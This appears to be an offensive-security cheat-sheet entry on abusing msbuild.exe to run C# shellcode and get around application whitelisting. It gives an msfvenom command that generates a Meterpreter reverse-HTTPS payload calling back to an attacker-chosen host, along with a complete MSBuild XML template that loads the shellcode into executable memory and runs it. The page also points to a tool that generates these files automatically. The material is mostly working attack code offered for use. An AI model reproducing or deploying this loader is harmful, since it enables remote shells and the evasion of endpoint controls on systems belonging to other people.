## Execute C\

### msbuild.exe

Use the following shell temlate and insert the csharp code and save as an xml

Replace “INSERT\_SHELLCODE\_HERE” in the template with the shellcode generated from Metasploit.

Note1: This includes "byte\[\] shellcode = new byte\[\]"

Note2: Use metasploit to generate C\# shellcode with the follow command: “msfvenom -a x86 –platform windows -p windows/meterpreter/reverse\_https LHOST=192.168.X.X LPORT=443 -f csharp”. Replace the value of LHOST with your own ip address.

```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 <!-- This inline task executes shellcode. -->
 <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
 <!-- Save This File And Execute The Above Command -->
 <!-- Author: Casey Smith, Twitter: @subTee -->
 <!-- License: BSD 3-Clause -->
 <Target Name="Hello">
 <ClassExample />
 </Target>
 <UsingTask
 TaskName="ClassExample"
 TaskFactory="CodeTaskFactory"
 AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
 <Task>

 <Code Type="Class" Language="cs">
 <![CDATA[
 using System;
 using System.Runtime.InteropServices;
 using Microsoft.Build.Framework;
 using Microsoft.Build.Utilities;
 public class ClassExample : Task, ITask
 { 
 private static UInt32 MEM_COMMIT = 0x1000; 
 private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; 
 [DllImport("kernel32")]
 private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
 UInt32 size, UInt32 flAllocationType, UInt32 flProtect); 
 [DllImport("kernel32")]
 private static extern IntPtr CreateThread( 
 UInt32 lpThreadAttributes,
 UInt32 dwStackSize,
 UInt32 lpStartAddress,
 IntPtr param,
 UInt32 dwCreationFlags,
 ref UInt32 lpThreadId 
 );
 [DllImport("kernel32")]
 private static extern UInt32 WaitForSingleObject( 
 IntPtr hHandle,
 UInt32 dwMilliseconds
 ); 
 public override bool Execute()
 {
 byte[] shellcode = new byte[] { INSERT_SHELLCODE_HERE } };

 UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
 MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
 IntPtr hThread = IntPtr.Zero;
 UInt32 threadId = 0;
 IntPtr pinfo = IntPtr.Zero;
 hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
 WaitForSingleObject(hThread, 0xFFFFFFFF);
 return true;
 } 
 } 
 ]]>
 </Code>
 </Task>
 </UsingTask>
 </Project>
```



[GreatSCT](https://github.com/ConsciousHacker/GreatSCT)--tool to automatically generate the xml file.

References:

[https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/](https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-msbuild-exe/)

